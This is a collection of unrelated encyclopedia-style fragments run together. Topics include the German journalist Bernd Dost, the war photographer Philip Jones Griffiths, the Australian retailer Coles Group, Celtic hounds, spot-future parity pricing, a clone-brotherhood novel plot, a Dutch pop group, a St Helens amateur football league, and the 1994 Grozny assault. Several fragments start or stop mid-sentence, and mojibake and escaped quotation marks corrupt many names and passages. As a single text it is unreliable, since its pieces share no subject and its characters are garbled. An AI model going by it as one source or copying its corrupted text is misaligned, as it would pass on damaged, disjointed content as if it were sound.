in his career but soon experienced financial difficulties associated with the Werbefilm-Studio, a company he co-founded with Canadian Richard Archer. The Studio did not last long, but through Archer, Dost met the Editor-in-Chief and founder of the M√ºnchner Abendzeitung (AZ), Werner Friedmann. Dost then wrote local stories and captions for the legendary photos of attractive local young women by glamour photographer and friend Kurt Huhle. This early \\"cheesecake\\" photography was published in the well-read AZ gossip column by Hannes \\"Hunter\\" Obermaier. It was at this time that the M√ºnchner Merkur became aware of Bernd Dost and hired him to write substantive reports. His successful affiliation with the newspaper ceased at the end of 1966 because of artistic and political differences with the main editorial office. The professional breakup resulted from an article Bernd Dost had written portraying the fate of impoverished Josefine Countess Wrbna-Kaunitz, a trustee of the estate of and confidante of the Wittelsbacher family, who had been snubbed by members of Bavaria‚Äôs royalty. In this affair, known as the \\"BAURA scandal\\" he championed the people who felt they had been duped by the legal staff of the President of the Bavarian Parliament, Rudolf Hanauer, a member of the conservative Christian Social Union (CSU) party. Under the presidential banner, plots of land were apparently sold illegally. Dost‚Äôs defense of those claiming \\"foul\\" was too politically sensitive for the M√ºnchner Merkur, particularly with its close ties to the CSU and he was soon looking for another job. He then went to Hamburg to write for Stern magazine with a very ambitious, if not ambiguous personal recommendation: \\"We can confirm that he is a very quick-witted journalist with an extremely clear opinion of his own.\\" Together with Heiko Gebhardt he soon became one of the young journalists featured at the magazine by chief editor Henri Nannen. Dost‚Äôs work was also held in high esteem by editors Peter Neuhauser and Manfred Bissinger. Film making In May 1968 Dost was sent to Paris to report on the student revolts as backup correspondent. After a period in Paris, he began his career as a documentary filmmaker in Munich. But, while working in the business program of the Bayerischer Rundfunk (Bavaria‚Äôs public Radio and TV complex), he seldom saw eye to eye with the editor-in-chief (and later TV director) Wolf Feller, an intimate friend of the Bavarian Prime Minister, Franz Josef Strauss, about the political content of their work. Nevertheless, he learned much in the fields of visual and drama arts that led to his writing, editing and directing TV documentaries. Dost established good friendships with cartoonist Dieter Hanitzsch and editor Brigitte Schroedter and good relationships with colleagues Wolfgang Kahle, Thilo Schneider, Dietmar Ebert, Karl Neumann, Henric L. Wuermeling, J√ºrgen Martin Moeller, Meggy Steffens, Christel Hinrichsen, and with Rudolf M√ºhlfenzl, the somewhat baroque, liberal editor- in-chief. In 1978 Bernd Dost married Caroline von Harder, a businesswoman, who headed the PR department of the Beck clothing store in Munich and who set up a mail order business of her own selling decorative household accessories. Their daughter Franziska Dost studied TV journalism and later, European Ethnology in Berlin. Fiction In 1998 Bernd Dost founded the Vedra Verlag in which he first published his own novels under the pseudonym of R.B. van Mattruer and later other books under his own name plus an extensive collection of short stories by Elisabeth Dost (Elli Dost). In the same year he wrote the book \\"Schiffe Versenken\\", a vivid novel set in the world of harbours, smugglers and thieves, using the language of the dockers and seamen and elements of Low German (\\"Platt\\") which you still can hear in Hamburg today (example: \\"Ich werd euch nun, min Deern un' min Jung, verklaren, wie's mit mir und Ronja weiterging.\\"). His next book \\"Tote leben l√§nger\\" describes the media hype created around a man in coma who was found in a corn field covered with wounds and suffering from a brain injury, while the TV talk show host Buck Blohm tries to present him as the returned and incarnated Jesus Christ. The book is outlined as a crime thriller though the actual story deals in a sarcastic way with conspiracy theories, tasteless politicians, bizarre journalists and other ominous characters all suddenly interested in the body of the unknown more- dead-than-alive man. With \\"die zornigen\\" (the enraged) Bernd Dost wrote his most transgressive/transgressional novel, telling the story of a small group of common people who \\"just can't take it anymore\\" and who turn to actions of terrorism against the mass media system. :\\"The book \\"die zornigen\\" is an infectious story of people who want to change our world. It throws a bridge of ideas stemming from the French Revolution over the dropouts of ¬¥68 across to the raging opponents to the merciless globalization of today. The story revolves around three people: Roger, the hesitating journalist, Cat, the aggressive nurse and Sol, the charismatic social worker. They among others, comprise \\"the enraged\\" - more enraged than ever, in view of the menacing annihilation of our pride, our freedom, our culture after 9/11.\\" (press text) In 2004 Dost wrote the surreal and tragicomic book \\"Mensch Frankenstein\\". The fantastic, mystical novel is the story of an honest, belligerent human creature born in a subway in the San Francisco, who is arrested and made to fit in with the rules of the predominant form of society; he receives a character mask and then a sculpted plastic body armour and rises to become a successful monster in the world of politics and industry. Self-revelation, the love of a courageous woman and the encounter with a mystic in Zurich save \\"Frankenstein the Man\\" and allow the natural true being to re-emerge. The US Administration sentences the creature, whom it regards as a danger to the state, and disposes of it in a branch of Guant√°namo. Bernd Dost's last novel was called \\"Der Zug ohne Wiederkehr\\" (The train of no return). The novel clearly continues the humanistic and humanitarian ideas of \\"the enraged\\" and \\"Mensch Frankenstein\\". It was published in 2008.

Biography  Jones Griffiths was born in Rhuddlan in Denbighshire, North Wales, to Joseph Griffiths, who supervised the local trucking service of the London, Midland and Scottish Railway, and Catherine Jones, Rhuddlan's district nurse, who ran a small maternity clinic at home. The introduction by Murray Sayle continues \\"In the Welsh manner, Philip uses the name of both his parents, to distinguish himself from all the other Joneses and Griffithses of the neighbourhood.\\" The couple had three sons, of whom Philip was the eldest. On leaving St Asaph's Grammar School at age 18, Philip, a pacifist and member of the Peace Pledge Union, was registered by the North Western Tribunal as a conscientious objector, obviating conscription to military service.Dictionary of National Biography He studied pharmacy in Liverpool and worked in London as the night manager at the Piccadilly branch of Boots, while also working as a part-time photographer for the Manchester Guardian. His first photograph was of a friend, taken with the family Brownie in a rowing boat off Holyhead. Jones Griffiths never married, saying it was a bourgeois notion, but that he had had \\"significant\\" relationships. Survived by Fanella Ferrato and Katherine Holden, his daughters from long-term relationships with Donna Ferrato and Heather Holden, he died from cancer on 19 March 2008. Journalist John Pilger wrote in tribute to Griffiths soon after his death: > I never met a foreigner who cared as wisely for the Vietnamese, or about > ordinary people everywhere under the heel of great power, as Philip Jones > Griffiths. He was the greatest photographer and one of the finest > journalists of my lifetime, and a humanitarian to match.

Career Boy destroying piano at Pant-y-Waen, South Wales, by Jones Griffiths, 1961. This woman was tagged with the designation VNC (Vietnamese civilian), Vietnam, by Jones Griffiths, 1967. Griffiths started work as a full-time freelance photographer in 1961 for The Observer, travelling to Algeria in 1962. He arrived in Vietnam in 1966, working for the Magnum agency. Magnum found his images difficult to sell to American magazines, as they concentrated on the suffering of the Vietnamese people and reflected his view of the war as an episode in the continuing decolonisation of former European possessions. However, he was eventually able to get a scoop that the American outlets liked: photographs of Jackie Kennedy holidaying with a male friend in Cambodia. The proceeds from these photos enabled him to continue his coverage of Vietnam and to publish Vietnam Inc. in 1971. Vietnam Inc. had a major influence on American perceptions of the war, and became a classic of photojournalism.\\"Vietnam Inc., Part I: A Photo-Journey Through the Villages, Fields, and Alleys of a Devastated Nation\\", Democracy Now!, 23 January 2002.\\"Vietnam Inc., Part II: A Photo-Journey through the Villages, Fields, and Alleys of a Devastated Nation\\", Democracy Now!, 24 January 2002. The book was the result of Griffiths' work between 1966 and 1971 in the country, and it stands as one of the most detailed surveys of any conflict. It includes critical descriptions of the horrors of the war as well as a study of Vietnamese rural life, and views from serving American soldiers. Probably one of its most quoted passages is of a US army source discussing napalm: > We sure are pleased with those backroom boys at Dow. The original product > wasn't so hot ‚Äì if the gooks were quick they could scrape it off. So the > boys started adding polystyrene ‚Äì now it sticks like shit to a blanket. But > if the gooks jumped under water it stopped burning, so they started adding > Willie Peter (white phosphorus) so's to make it burn better. And just one > drop is enough, it'll keep on burning right down to the bone so they die > anyway from phosphorus poisoning. Henri Cartier-Bresson said of Griffiths' \\"Not since Goya has anyone portrayed war like Philip Jones Griffiths.\\" The South Vietnamese president, Nguy·ªÖn VƒÉn Thi·ªáu, criticised Griffiths' work, remarking \\"Let me tell you there are many people I don't want back in my country, but I can assure you Mr. Griffiths name is at the top of the list.\\" In 1973, Griffiths covered the Yom Kippur War. He then worked in Cambodia from 1973 to 1975. In 1980, he became the president of Magnum, a position he held for five years. In 2001 Vietnam Inc. was reprinted with a foreword by Noam Chomsky. Subsequent books have included Dark Odyssey, a collection of his best pictures and Agent Orange, dealing with the impact of the US defoliant Agent Orange on postwar generations in Vietnam. Philip Jones Griffiths Foundation for the Study of War After becoming aware of his terminal condition in 2001, Jones Griffiths launched a Foundation to preserve his archives. As trustees, his two daughters helm the Foundation. In 2015, the National Library of Wales in Aberystwyth acquired the entire Philip Jones Griffiths archive, which includes approximately 150,000 slides and 30,000 prints.\\"National Library of Wales home for Jones Griffiths archive\\".

Its chief operations are primarily concerned with the sale of food and groceries through its flagship supermarket chain Coles, and the sale of liquor and petrol through its Coles Liquor and Coles Express outlets. Since its foundation in Collingwood, Victoria in 1914, Coles has grown to become the second-largest retailer in Australia after its principal rival Woolworths in terms of revenue. Formerly known as Coles Myer Ltd. from 1985 to 2006, Coles Group was owned by Western Australian conglomerate Wesfarmers from 2007 until 2018, when it was spun-off, with it once again listed as an independent public company on the Australian Stock Exchange, containing Coles Supermarkets, Coles Online, Coles Express, Coles' liquor division, Coles' financial division and a half-share in FlyBuys, with former assets Kmart, Target and Officeworks remaining subsidiaries of Wesfarmers.

Coles was run in succession by members of the Coles family from 1914 until the mid-1970s by the \\"famous five knights\\", brothers Sir George, Sir Arthur, Sir Edgar, Sir Kenneth and Sir Norman ‚Äì known by their first initials ‚Äì GJ, AW, EB, KF, NC. In 1960, the first supermarket was opened in the Melbourne suburb of North Balwyn and in 1973, a Coles store had been established in all capital cities of the country. Kmart Australia Limited was born out of a joint venture between G.J Coles & Coy (Coles) and Kmart Corporation in the US. The first store opened in the Melbourne suburb of Burwood in 1969. In 1978 Coles acquired full ownership of the Australian K-Mart operation and in 1994 bought back all shares Kmart Corporation held in Coles Myer. A long-term licensing agreement allows Coles Group to use the Kmart name. Kmart New Zealand shares merchandise and branding with Kmart Australia, and is owned by Coles Group Holdings New Zealand. In Australia, BI-LO was established by John Weekes in Adelaide during the late 1970s. It is a major supermarket chain owned and operated by retail giant Coles Group in parallel to Coles Supermarkets. It has more than 200 stores in Australia. A new head office opened in 1987 at Hawthorn East, Melbourne. As of 2008, it remained the head office for Coles Supermarkets and associated subsidiaries. In 1996, BI-LO acquired the six- store Newmart discount supermarket chain in Western Australia which then became the equivalent to BI-LO in Western Australia. By August 2002, it grew to 16 stores before being transferred to the management and being re branded as Coles, though some stores were sold off to Foodland Associated Limited and became Action Supermarkets. Coles Group Limited was listed on the Australian Securities Exchange with the code CGJ, which references back to its first ever registered company name of G.J. Coles & Coy Proprietary Limited. The company has in the past been listed on the NYSE (de-listed 6 January 2006), the New Zealand Stock Exchange (de-listed 1989) and the London Stock Exchange.  Myer  Sidney Myer arrived in Melbourne in 1899, working briefly at a drapery store before moving to Bendigo where he and his partner, Jacob Slonim, opened the first store in 1900. A second store opened in 1908. In 1911 Myer bought a drapery store in Bourke Street, Melbourne, which later became the flagship Myer store, the Myer Emporium. Myer expanded to Adelaide, acquiring a shareholding in Marshall's department store in 1925, later renaming this company as Myer SA Stores Ltd. Expansion across Australia followed.* (Myer was bought from Coles Myer in 2006 causing the name change to Coles Group.)  Merger of GJ Coles and Myer Both chains grew throughout Australia through growth and acquisitions, and both independently listed on the Australian Stock Exchange. By the 1980s, Coles primarily operated supermarkets, whilst Myer (Myer Emporium Limited) operated the department store chains Myer and Grace Bros, as well as the Target discount variety store chain in Australia. In August 1985, the Myer Emporium Ltd and GJ Coles & Coy Ltd merged, becoming the largest ever Australian Corporation. The official name change to \\"Coles Myer Limited\\" followed in January 1986. Coles Group was previously known as Coles Myer (1986‚Äì2006)  After the merger  The office stationery chain Officeworks, based on the US chain Office Depot, was established in 1993 with the first store opening in the Melbourne suburb of Richmond in June 1994. This represented a successful introduction of a \\"category killer\\" ‚Äì by comparison, around the same time Coles unsuccessfully attempted to negate the arrival of Toys \\"R\\" Us with the short-lived chain World 4 Kids. In 1996, the operations of Target and Fosseys (earlier \\"Coles-Fossey\\") merged and the first Baby Target speciality store was opened, followed in 1998 by Target Home. In 1999, regional Fosseys stores were re-badged as Target Country, with metropolitan stores closed. Following Target's operating loss of $43m in 2001, the chain's format was repositioned to compete less with Kmart, Woolworths Limited's Big W, Harris Scarfe and The Warehouse, and more with Myer, with a focus on \\"middle class\\" quality products, especially clothing and home wares. In 1998, Coles Myer opened the first Megamart store, in Coorparoo, Queensland. Harris Technology, a computer hardware and software reseller started by Ron Harris in 1986, was acquired in 1999. By 2001, Coles Myer planned to expand the Megamart chain of furniture and electrical stores, but by 2005 had decided to divest the struggling chain. Six of the nine stores were sold to competitor Harvey Norman, with the remainder closed. In 2001, the Company appointed John Fletcher, formerly of Brambles, as chief executive. Fletcher engineered a brief turnaround in the company's fortunes. Fletcher abolished the shareholder discount card, on the basis that it had eroded margins while providing little benefit, and was unpopular with institutional investors. Since their introduction in the early 1990s, the card had induced a tenfold increase in the number of Coles Myer's shareholders, with the overwhelming majority owning only small parcels of shares. Fletcher also engineered the acquisition of the retail fuel operations of Shell Australia with the fuel outlets rebranded as Coles Express, allowing Coles Group to counter the success of Woolworths' discount petrol operation. Woolworths subsequently gained entry to part of Caltex Australia's network to provide a recognised brand for its fuel offer. Sale of Myer In August 2005, Coles Myer called for expressions of interest in selling the perennially underperforming Myer department stores. There was significant interest from both Australian and overseas investors, including the Myer family. On 13 March 2006, Coles Myer announced it would sell Myer to a consortium largely controlled by US private equity group Newbridge Capital, part of the Texas Pacific Group. The Myer family retained a 5% stake. Texas Pacific had interests in UK department store Debenhams and high-end US retailer Neiman Marcus. The sale was completed in June 2006. With the sale of Myer, the parent company received shareholder approval to rename as Coles Group Ltd, effective 27 November 2006. Sale of Coles Group Coles Group planned to rebrand its assorted holdings under the Coles name, with plans to have all holdings other than Officeworks and Target rebranded by late 2007. This plan was not well received by investors, most of whom reportedly believed that such a significant change to the flagship supermarkets business would be too risky and cause an eventual decline in market share. (The plan was eventually put on hold in March 2007 due to the proposed sale of Coles Group.) In August 2006, Coles announced that a group of private equity companies led by Kohlberg Kravis Roberts & Co. (KKR) was looking to buy the company, with an initial proposal of $14.50 per share. The Coles board rejected the offer stating it significantly undervalued the company, and was conditional on a due diligence process, without a guarantee that the deal would go ahead. A second proposal of $15.25 per share in October 2006 was rejected for largely the same reasons. In November 2006, long-term senior supermarkets executive Peter Scott was dismissed for an unspecified breach of the company's code of conduct. On 23 February 2007, the company announced a downgrade of expected earnings and that it was considering ownership options, including the possibility of a full sale of the business or restructuring such as a demerger. On 20 March 2007, it deferred its plans to rebrand Kmart under the Coles banner and create supercentres, and subsequently paused its conversion of BI-LO stores to Coles Supermarkets given the lack of success of this move. On 23 March, Coles Group stated it planned to sell its businesses as either an entire package, or in three parts (Officeworks, Target and the remaining businesses Kmart, Coles, Bi-Lo, Liquorland, Vintage Cellars and First Choice Liquor). On 3 April, Solomon Lew, the former chairman and long-time antagonist of the current board and management team, sold his 5.8% shareholding of the company. A large portion of these shares were bought by Wesfarmers, which was believed to be part of a consortium of bidders including Macquarie Bank, PEP and Permira. The share price at which the transaction took place was reportedly $16.47, then 2.2% above the market price. A bid for the entire company at this price would have valued Coles Group at A$19.7 billion, well above the two KKR proposals announced in 2006. In May 2007, Coles reported its slowest sales growth in at least seven years with continuing poor performance from Coles Supermarkets and Kmart. On 2 July 2007, Wesfarmers announced it intended to buy Coles Group for $22 billion, the largest take- over bid in Australia. The sale was expected to be completed in October 2007. In August 2007, Wesfarmers foreshadowed its plans for the restructuring of Coles Group following its anticipated takeover, including investment of A$5 billion, establishing three separate divisions (including a combined Bunnings/Officeworks \\"big box\\" retailing division), the possible sale of Kmart, and the exit of Coles Group from its head office base at Tooronga. The independent expert report published in October 2007, advising shareholders preparatory to the proposed sale was critical of the culture within Coles Group. At a shareholder meeting in Melbourne on 7 November 2007, shareholders voted overwhelmingly with 99.25% approval of the sale of Coles Group to Wesfarmers. The Scheme of Arrangement between Coles Group and its shareholders was approved by the Supreme Court of Victoria on 9 November 2007, the last day Coles Group shares traded on the Australian Securities Exchange. The Scheme was implemented on 23 November 2007, ending Coles Group as a company with its subsidiaries merged into Wesfarmers' business structure. Relisting Coles Group Limited was spun-off from Wesfarmers on 21 November 2018, with the company once again listed as a public company on the Australian Stock Exchange under the trading code , debuting at A$12.49. At the time of listing, the company included 806 Coles Supermarkets, 712 Coles Express outlets, 894 liquor stores including Liquorland, Vintage Cellars and First Choice Liquor, Coles- branded financial services and 88 Spirit Hotels, as well as joint-ownership of the FlyBuys loyalty program. Wesfarmers retained a 15 percent stake in Coles Group as well as full ownership of Kmart, Target and Officeworks, which were previously part of the former Coles Group incarnation.

They may have corresponded to the Greyhound, Scottish Deerhound, Irish Wolfhound, or ancestors of all of these breeds. Celtic hounds can be found in Celtic jewelry designs and paintings as far back as the 17th century. In legends The Irish word c√∫ () for \\"hound\\" derives from the Primitive Irish cuna, which is from Proto-Celtic *k≈´ (\\"dog\\", \\"wolf\\"), which in turn derives from Proto-Indo-European *·∏±w·πì, \\"dog.\\" Many Irish myths and legends include mentions of hounds. One of the most famous involves the Celtic hero C√∫chulainn (the Hound of Ulster) or (the Hound of Culann) who killed a blacksmith's Celtic hound in self-defense. When Culann, the blacksmith, asked who would now guard his household, the young Setanta offered to take the dog's place for a year, while training a pup to replace the dead dog. This gained Setanta the nickname of 'the Hound of Culann' or C√∫ Chulainn. Cuchulainn went on to become one of the greatest warrior legends of that era. Bran and Sceolan were the most famous dogs of the poet warrior, Fionn mac Cumhaill. The mother of Bran and Sceolan was Tuiren, Fionn Mac Cumhaill's aunt, transformed into a hound by a Sidhe woman Uct Dealbh, irritated by Tuiren's marriage with Uct Dealbh's husband. In Welsh mythology, Gwyn ap Nudd was the ruler of Annwn (the Underworld) and escorted the souls of the dead there, leading a pack of supernatural hounds, called the C≈µn Annwn (Hounds of Annwn) (see also Wild Hunt). Another well-known Welsh legend is that of Prince Llewellyn 's hound Gelert, who was unjustly slain by his master after being wrongly thought to have killed a child. Use Irish Wolfhounds were used to hunt wolves, and as war dogs to attack men on horseback and drag them from their saddles in order to be killed. Scottish Deerhounds, being more placid, were reluctant war dogs and were more used for hunting game, especially red deer. Greyhounds, lighter and smaller, were used to hunt hares and small mammals. Celtic hounds were called the Irish Greyhound and had other names according to area. The Galgo Espanol breed is thought to be descended from the Celtic hounds, as is the Tyrolean Hound.

That is, if a person can purchase a good for price S and conclude a contract to sell it one month later at a price of F, the price difference should be no greater than the cost of using money less any expenses (or earnings) from holding the asset; if the difference is greater, the person has an opportunity to buy and sell the \\"spots\\" and \\"futures\\" for a risk-free profit, i.e. an arbitrage. Spot‚Äìfuture parity is an application of the law of one price; see also Rational pricing and #Futures. The spot-future parity condition does not say that prices must be equal (once adjusted), but rather that when the condition is not met, it should be possible to sell one and purchase the other for a risk-free profit. In highly liquid and developed markets, actual prices on the spot and futures markets may effectively fulfill the condition. When the condition is consistently not met for a given asset, the implication is that some condition of the market prevents effective arbitration; possible reasons include high transaction costs, regulations and legal restrictions, low liquidity, or poor enforceability of legal contracts. Spot‚Äìfuture parity can be used for virtually any asset where a future may be purchased, but is particularly common in currency markets, commodities, stock futures markets, and bond markets. It is also essential to price determination in swap markets.  Mathematical expression  In the complete form: : F = Se^{(r+y-q-u)T} Where: : F, S represent the cost of the good on the futures market and the spot market, respectively. : e is the mathematical constant for the base of the natural logarithm. : r is the applicable interest rate (for arbitrage, the cost of borrowing), stated at the continuous compounding rate. : y is the storage cost over the life of the contract. : q are any dividends accruing to the asset over the period between the spot contract (i.e. today) and the delivery date for the futures contract. : u is the convenience yield, which includes any costs incurred (or lost benefits) due to not having physical possession of the asset during the contract period. : T is the time period applicable (fraction of a year) to delivery of the forward contract. This may be simplified depending on the nature of the asset applicable; it is often seen in the form below, which applies for an asset with no dividends, storage or convenience costs. Alternatively, r can be seen as the net total cost of carrying (that is, the sum of interest, dividends, convenience and storage). Note that the formulation assumes that transaction costs are insignificant. Simplified form: : F = Se^{rT} Pricing of existing futures contracts Existing futures contracts can be priced using elements of the spot-futures parity equation, where K is the settlement price of the existing contract, S_0 is the current spot price and P_0 is the (expected) value of the existing contract today: : P_0 = S_0 - K e^{-rT} which upon application of the spot-futures parity equation becomes: : P_0 = (F_0 - K)e^{-rT} Where F_0 is the forward price today.

Plot summary Robert Naysmith is a member of the United Nations Inspectorate, an international police force that neutralizes threats to world peace. He is also a member of the Rostomily Brotherhood, a secret order within the Inspectorate made up of men cloned from Stefan Rostomily, a member of the French resistance during World War III. Naysmith is ordered to carry on the assignment of Martin Donner, another member of the Brotherhood who was killed while investigating an anti-UN conspiracy. Atypically for a Brother, Donner had a wife and child, and Naysmith's first task is to impersonate Donner long enough to persuade his family to go into hiding with him. Naysmith leaves Donner's wife and son in an isolated cabin in the Canadian Rockies. He then kidnaps and drugs a member of the conspiracy, learning that he has been assigned to assassinate Barney Rosenberg, a Martian colonist who is returning to Earth to retire. Naysmith teams up with a Finnish Brother named Juho Lampi to rescue Rosenberg, and learns that he was a close friend of the original Rostomily. After leaving Rosenberg with the Donners, Naysmith and his partner arrange to be captured by the conspiracy. They are brought to the secret sea base of Arnold Besser, UN Minister of International Finance and the leader of the conspiracy. They find themselves joined by two more captive Brothers, along with Besser himself. Before Besser can begin torturing Naysmith and the others, the secret base is attacked by UN police, and Besser's bodyguard (actually another Brother, surgically altered to look like Besser's bodyguard) kills Besser and frees the others. Following the raid, the information found in Besser's secret base allows the UN to roll up the conspiracy. Donner's wife tracks down Naysmith and asks him to marry her.

They released two albums in their short-lived career during 1989‚Äì1991 ‚Äì Sucker For Your Love and Don't Stop The Dance. They first came to prominence performing in the Dutch TV show, The Pin Up Club, around 1988/1989, eventually recording and releasing what was to become its theme song, \\"We Cheer You Up (Join The Pin Up Club)\\". a happy uptempo pop song in the Euro disco vein of that time, was a quick hit in the Top 10 in their native Netherlands, and gathered some momentum and interest around the Continent. The infamous video, which featured topless female dancing, was also aired frequently in the UK on the now defunct music video request channel, Lifestyle Satellite Jukebox, in 1991‚Äì1992. A debut album consisting of a few original tracks, covers and remixes the title track \\"Sucker For Your Love\\", that was a cover version of Toto Coelo's song \\"Dracula's Tango\\", and also including a version of \\"Sumer in the City\\", followed around late 1989/early 1990. It yielded further singles in \\"(Like A) Fata Morgana\\", and the title track \\"Sucker For Your Love\\". However, apart from becoming minor hits in the Netherlands and Finland where their debut album went gold, they were not an international breakthrough. A year later at the time of their second album Don't Stop The Dance, the line-up had changed slightly.

History  The league was formed on 4 August 1917 when Ernest Worrall distributed notices to several of his friends & colleagues calling a meeting in the old LMS Club now known as The British Rail Club, Penlake Lane, Sutton. A league was formed but was initially known as The St Helens & District Junior Football League. The officers were Harry Thompson (Chairman), John Marsh (President) & Ernest Worrall (Gen Secretary). The League Championship Cup dates back to the year 1917 but in 1919, Mr John Martin, a town centre hairdresser, presented the ‚ÄúMartin Cup‚Äù to the league. This Cup competition became immediately very popular especially in the 1930-1940 period when crowd numbers reached 3000-4000. In 1921, a restructure of the divisions resulted in the division 1 clubs being formed into the St Helens ‚ÄúSenior‚Äù league and a further amalgamation saw Div1 and Div2 clubs having sections A & B thus forming the combination of sections. At the end of the 1921/22 season following a special meeting it was decided to run the league similar to that of the neighbouring Lancashire Alliance thus the St Helens and & District Junior League now became The St Helens & District Football Combination to commence in \\"March 1923‚Äù. Running parallel with the Combination in the late 1920s and throughout the 1930s and early 1940s was the Sunday School League in which the majority of the church clubs took part. Clubs in the Sunday School League played for the Hewitt Cup (origin unknown) and players received a silver and enamel medal. When that league finished clubs like Holy Cross and Holy Trinity eventually joined the combination. In 1926 the Hospitals Charity Cup was introduced and is now the Combinations main cup competition and played for in open tournament for all combination clubs. In 1926 the Rainford Potteries Company donated to the Rainford Potteries Cup which at present is at temporary retirement. The DH Griffiths & Tom Worrall cup (1933) is the present Divisional Cups played for to coincide into an end of season final. In the 1930s the most popular cup venue was Peasley Cross Rec, but since the loss of the ground due to industrial building several well- known venues were used; e.g. British Rail, (Penlake Sutton), Beecham's (Sutton Road), Greenall Whitley (Alder Hey Road) and at each ground, the attendance was outstanding. Finally at the eventual loss of these grounds the Hospital Cup Final which had become the Combination's F.A. Cup was held at St Helens Town Hoghton Road, but sadly, as progress is inevitable the ‚ÄúTown Ground‚Äù is no longer available, but up to the present moment Prescot Cables have come to the rescue and the Hospital Cup Final at Valerie Park Prescot has now become a very popular venue. Going back to the pre-war years many talented clubs have graced the local Pitches. Names Like, British Sidac, Greenalls FC, Haydock C&B; Recs, Haydock Villa (who in 1937/38 won 5 Trophies), Derbyshire Hill Rovers, Holy Cross, Holy Trinity, Beechams and Pilkingtons to name but a few. Even during the war years, football still was organised by the Combination, but only with a struggle as it was dramatically short of clubs and players. League rules were annulled so a ‚ÄúHome Guard‚Äù section was formed to accommodate up to eight clubs at one spell, following the World War II things got back to normal. Alf Moran was a long serving Chairman with popular secretary Jock Craig, the President was Tom Gordon MBE. Other officials to the present day, as Ernie Worrall, the Combination founder said, the four stalwarts of any league were. President, Chairman, Secretary and Treasurer, many well-known local figures have filled these roles over the years namely Presidents: John Marsh, Hugh Collins, Harry Wimpenny, Tom Gordon, Gerald Seddon and Latterly Bert Rawsthorne. Chairmen have included Harry Thompson, Arthur Fenton, Gus Atkins, Alf Moran, Gil Ryan, and the present incumbent Eric Bond. The job of Secretary, never easy, has been magnificently carried out by Ernie Worrall, Peter Smith, E Bradbury, R Williams, Ernie Baines, Jim Craig, David Watkins & the final secretary Robert Deakin. Treasurers have included W Leyland, Roddie Winstanley, Harry Wimpenny, John May, Jim Craig, J Dutton, Gil Ryan, Derek Roughley and the last man in office Derek Cleveland.  Final Seasons  The Combination which comprised 15 clubs at end went from strength to strength since its formation, well over three quarters of a century ago to eventually decline, folding in 2016 due to lack of teams. It helped hundreds of young, and not so young footballers to get their feet on the ladders to success and is a perfect example of the well-known phrase: ‚ÄúGRASS ROOTS FOOTBALL.‚Äù Its clubs have won Liverpool County FA & Lancashire County FA Cup Competitions. Its Youth and Open Age Inter League sides, have lifted Liverpool County FA & Lancashire County FA Trophies and a number of players have gone on to tread the holy grounds of the football league and in some cases the world. During the 2010‚Äì2011 season, Division Two club Mere recorded an unbeaten campaign, in their debut season in the St Helens Combination. After playing twenty games, their record was nineteen wins, one draw and no losses, scoring exactly one hundred goals in the process. An achievement never attained by any other club in the history of the league. Knowsley South were treble winners in the 2010‚Äì2011 season. Winners of the Premier Division for 2015‚Äì2016 were New Street Reserves. Winners of Division One for 2015‚Äì2016 were Cheshire Lines Reserves.

The attack was conducted by armed formations of the opposition Provisional Council, led by Umar Avturkhanov, with a clandestine support of Russian Federation's armor and aircraft on 26 November 1994. The fighting subdued after the first 10 hours, with the Chechen Republic of Ichkeria decisively repelling the assault. The Russian government officially denied military involvement in the operation, but openly supported the Provisional Council. The attack ended in failure, with 70 Russian soldiers being captured. Dudayev threatened to execute the Russian prisoners in an attempt to get an admission from Russia in regards to their involvement, prompting the government in Moscow to demand that Armed forces of Ichkeria free the captives and lay down their arms within 48 hours or face military intervention. The incident led to the large-scale military invasion of the republic that began in December 1994. Background In the summer of 1994 the FSK (the former KGB and future FSB) began an active co-operation with leaders of the Chechen internal opposition against Dudayev, uniting them in a body named the Provisional Council of the Chechen Republic. Forces of Umar Avturkhanov (a former officer of the Soviet MVD) and Beslan Gantemirov (a former mayor of Grozny and Dudayev's ally- turned-enemy) received from Moscow not only money but also training and arms, including heavy weapons. The months of August and September saw the outbreak of fighting between the opposition and Dudayev's forces. By this time, the opposition had established a well armed force of several hundred men, equipped with armoured vehicles and covertly backed by Russian helicopters operating from an air base at Mozdok, Republic of North Ossetia‚ÄìAlania. This military campaign climaxed in an attack on Grozny on 15‚Äì16 October, when the militias of Gantamirov (advancing north from the newly seized ChRI base at Gekhi) and Ruslan Labazanov (advancing south from Znamenskoye) unsuccessfully attempted to take the city by a joint assault for the first time (Labazanov alone had previously also attempted to enter Grozny on August 24). Disappointed by their failures and aware of their military weakness up to and after the October assault, the Chechen opposition, aided by an ethnic-Chechen former Chairman of the State Duma, Ruslan Khasbulatov, intensified their lobbying with the FSK and Russian president Boris Yeltsin's staff in favour of more direct involvement on Moscow's part. As a result, Avturkhanov and Gantemirov, who by then have joined their militias, received all the weapons, instructors, training and media support they requested, setting the ground for the final assault. In October, Russia's Defense Minister General Pavel Grachev ordered the formation of a special task force of the Main Operations Directorate of the General Staff of the Armed Forces of the Russian Federation, led by the Deputy Chief of the Main Operations Directorate Anatoly Kvashnin and General Leontiy Shevtsov. Active duty tank crewmen from Russia's elite formations in the Moscow Military District, as well as other Russian personnel such as 18 helicopter crewmen from the North Caucasus Military District, were recruited as a mercenaries, provided with fake documents and sent into Chechnya. A transport of 50 additional armored vehicles were also brought in by the FSK. The issues of recruitment (Russian tank commanders were reportedly offered an equivalent of $1,500 to participate in the coup) and transfer of weapons involved the Deputy Director of the FSK in charge of supervising the Caucasus, General Sergei Stepashin (his emissary to Chechnya was the FSK Colonel Khromchenko) and Russia's Deputy Minister for Nationalities, General Alexander Kotenkov, as well as his direct superior, Nikolai Yegorov. Attack On 22 November, the Provisional Council began preparing their final assault on Grozny. A large group of Russian officers led Chief of General Staff, Mikhail Kolesnikov, flew from Moscow to Mozdok, and the direct supervision of combat operations was entrusted to the deputy commander of Russia's 8th Guards Army Corps from Volgograd, General Gennady Zhukov. A convoy of Russian armored vehicles entered the territory of Chechnya. The first clash took place 10 kilometers from the border near Tolstoi-Yurt, when a small group of Dudayev's supporters ambushed the convoy and disabled two tanks. On the following day, en route towards Urus-Martan, the convoy was again attacked near the settlement of Alkhan-Kala (Yermolovka) resulting in a loss of another tank. In spite of this, the pro-Dudayev's forces in Grozny were believed to be unable to organize resistance to such a large-scale attack. On the morning of 26 November, the Russian and their Chechen allies entered the capital in the motorised columns advancing from two directions, Nadterechny District and Urus-Martanovsky District, supported by several unmarked federal attack aircraft. According to Chechen commander Dalkhan Khozhaev, the coup force in Grozny numbered 42 T-72 main battle tanks, eight BTR-80 armoured personnel carriers, various other vehicles, a number of aircraft, and more than 3,000 men. Russian 